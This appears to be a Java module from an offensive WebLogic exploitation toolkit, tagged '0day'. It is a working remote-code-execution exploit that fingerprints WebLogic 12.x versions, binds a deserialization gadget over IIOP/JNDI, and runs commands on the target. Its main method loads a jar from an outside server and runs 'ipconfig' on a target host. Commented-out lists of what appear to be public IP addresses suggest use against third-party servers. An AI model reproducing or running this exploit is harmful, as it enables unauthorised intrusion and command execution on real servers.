package com.weblogic.framework.payloads.impl;

import cn.hutool.core.io.IORuntimeException;
import cn.hutool.http.HttpUtil;
import com.weblogic.framework.annotation.Authors;
import com.weblogic.framework.annotation.Dependencies;
import com.weblogic.framework.annotation.Tags;
import com.weblogic.framework.annotation.Versions;
import com.weblogic.framework.entity.ContextPojo;
import com.weblogic.framework.entity.MyException;
import com.weblogic.framework.gadget.ObjectPayload;
import com.weblogic.framework.gadget.impl.LimitFilterGadget;
import com.weblogic.framework.payloads.VulTest;
import com.weblogic.framework.utils.VulUtils;
import javassist.ClassPool;
import javassist.CtClass;
import weblogic.cluster.singleton.ClusterMasterRemote;

import javax.naming.Context;
import java.io.Serializable;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.Remote;
import java.util.ArrayList;
import java.util.List;

import static com.weblogic.framework.config.CharsetConfig.defaultCharsetName;
import static com.weblogic.framework.utils.CallUtils.*;
import static com.weblogic.framework.utils.ClassLoaderUtils.loadJar;
import static com.weblogic.framework.utils.ContextUtils.rebind;
import static com.weblogic.framework.utils.StringUtils.getRandomString;
import static com.weblogic.framework.utils.VersionUtils.checkVersion;
import static com.weblogic.framework.utils.VersionUtils.getVersion;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: S1274489
 * Desc: S1274489
 * Date:2020/3/31 21:25
 * Email:woo0nise@gmail.com
 * Company:www.r4v3zn.com
 * @author R4v3zn
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":Unknown"})
@Versions({"12.1.3.0", "12.2.1.3.0", "12.2.1.4.0"})
@Tags({"0day"})
public class S1274489 implements VulTest {

    /**
     * 漏洞利用 jar 文件名称
     */
    public static final String[] DEPENDENCIES = new String[]{"coherence.jar"};


    /**
     * 漏洞影响版本
     */
    private static final String[] VUL_VERSIONS = new String[]{"12.1.3.0", "12.1.3.0.0", "12.2.1.3.0", "12.2.1.3.0.0", "12.2.1.4.0", "12.2.1.4.0.0"};

    /**
     * remote
     */
    private Object remote = null;

    /**
     * bindName
     */
    private String bindName = "";

    /**
     * current context
     */
    private Context currentContext = null;

    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param url url
     * @param param 执行参数
     * @return
     * @throws Exception
     */
    @Override
    public Boolean vulnerable(String url, String... param) throws Exception {
        if(isBlank(url)){
            throw new MyException("URL 不能为空");
        }
        if(!url.startsWith("http")){
            url = "http://"+url;
        }
        try{
            HttpUtil.get(url,5);
        }catch (Exception e){
            if(e instanceof IORuntimeException){
                throw new MyException("URL 无法访问");
            }
        }
        URL checkURL = new URL(url);
        String ip = checkURL.getHost();
        Integer port = checkURL.getPort() == -1 ? checkURL.getDefaultPort():checkURL.getPort();
//        String protocol = checkURL.getProtocol();
        String version = getVersion(ip, port);
        version = version.replace(".0.0",".0");
        Boolean flag = checkVersion(version, VUL_VERSIONS);
        if(!flag){
            return false;
        }
        if(!version.contains("12.1.3.0") && param.length == 0){
            throw new MyException("please set your javascript file url!");
        }
        URLClassLoader urlClassLoader = null;
        try{
            urlClassLoader = loadJar(version, DEPENDENCIES);
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }
        String javascriptUrl = "";
        if(param.length == 0 || version.contains("12.1.3.0")){
            javascriptUrl = "";
        }else{
            javascriptUrl = param[0];
            try{
                String rsp = HttpUtil.get(javascriptUrl, 5);
                if(!rsp.contains("org/mozilla/javascript/regexp/") && !rsp.contains("org/mozilla/javascript/tools/resources")){
                    throw new MyException("无法访问 javascript 文件,请配置正确的路径!");
                }
            }catch (Exception e){
                if(e instanceof IORuntimeException){
                    throw new MyException("无法访问 javascript 文件,请配置正确的路径!");
                }else{
                    throw new MyException("无法访问 javascript 文件,请配置正确的路径!");
                }
            }
        }
        String charsetName = "";
        String callName = ClusterMasterRemote.class.getSimpleName();
        if(param.length > 3){
            charsetName = param[2];
            callName = param[3];
        }
        if(isBlank(charsetName)){
            charsetName = defaultCharsetName;
        }
        Class<? extends Remote> callClazz = CALL_MAP.get(callName);
        ObjectPayload<Serializable> objectPayload = new LimitFilterGadget();
        bindName = getRandomString(16);
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass =  pool.get(callClazz.getName());
        if(ctClass.isFrozen()){
            ctClass.defrost();
        }
        ctClass.setName(callClazz.getSimpleName());
        byte[] bytes = ctClass.toBytecode();
        ctClass.defrost();
        Object object = objectPayload.getObject(bytes,new String[]{bindName, javascriptUrl}, callClazz.getSimpleName(), urlClassLoader);
        String jndiUrl = String.format("iiop://%s:%s", ip, port);
        ContextPojo contextPojo = null;
        try{
            contextPojo = rebind(jndiUrl, object, urlClassLoader);
        }catch (Exception e){
            e.printStackTrace();
        }
        if(contextPojo == null || contextPojo.getContext() == null || contextPojo.getUrlClassLoader() == null){
            return false;
        }
        Context context = contextPojo.getContext();
        System.out.println("[*] bind name --> "+bindName+" ok !");
        try{
            Object objectCall = context.lookup(bindName);
            this.currentContext = context;
            this.remote = objectCall;
            String cmd = "echo a136d86442181f45a4446f5fb8a49f7f";
            cmd += "@@"+charsetName+"####"+ip+":"+port;
            String rsp = callExec(cmd,objectCall);
            return rsp.contains("a136d86442181f45a4446f5fb8a49f7f");
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }finally {
            System.gc();
            urlClassLoader.close();
        }
    }

    /**
     * 漏洞利用
     * @param url
     * @throws Exception 抛出异常
     */
    @Override
    public String exploit(String url, String... param) throws Exception {
        return VulUtils.exploit(url, remote, param);
    }


    public static void main(String[] args) throws Exception {
        String url = "http://192.168.1.6:8080/com.bea.javascript.jar";
//        url = "http://192.168.1.3:9999/com.bea.javascript.jar";
        url = "http://45.32.23.211:8080/com.bea.javascript.jar";
        List<String> hostList = new ArrayList();
//        hostList.add("192.168.1.3:7001");
//        hostList.add("192.168.1.11:7001");
//        hostList.add("192.168.1.12:7001");
        // 129.144.145.179:7001
        // 35.244.31.56:7001
//        hostList.add("35.244.31.56:7001");
//        hostList.add("150.136.146.91:7001");
//        hostList.add("129.146.88.47:7001");
//        hostList.add("101.227.181.106:80");
        S1274489 vul = new S1274489();
        System.out.println(vul.vulnerable("http://192.168.1.9:7001"));
        System.out.println(vul.exploit("http://192.168.1.9:7001","ipconfig"));
//        ClassPool pool = ClassPool.getDefault();
//        try {
//            CtClass ctClass =  pool.get("com.weblogic.framework.call.RmiPocServerClusterMasterRemote");
//            ctClass.setName("RmiPocServerClusterMasterRemote");
//            byte[] bytes = ctClass.toBytecode();
//            System.out.println(ctClass);
//            System.out.println(ctClass);
//        } catch (NotFoundException e) {
//            e.printStackTrace();
//        } catch (CannotCompileException e) {
//            e.printStackTrace();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//        ctClass.
//        ctClass
        // http:///
//        for (String host:hostList) {
//            String ip = host.split(":")[0];
//            Integer port = Integer.parseInt(host.split(":")[1]);
//            S1274489 vul = new S1274489();
//            vul.exploit(ip, port,url);
//        }
    }
}
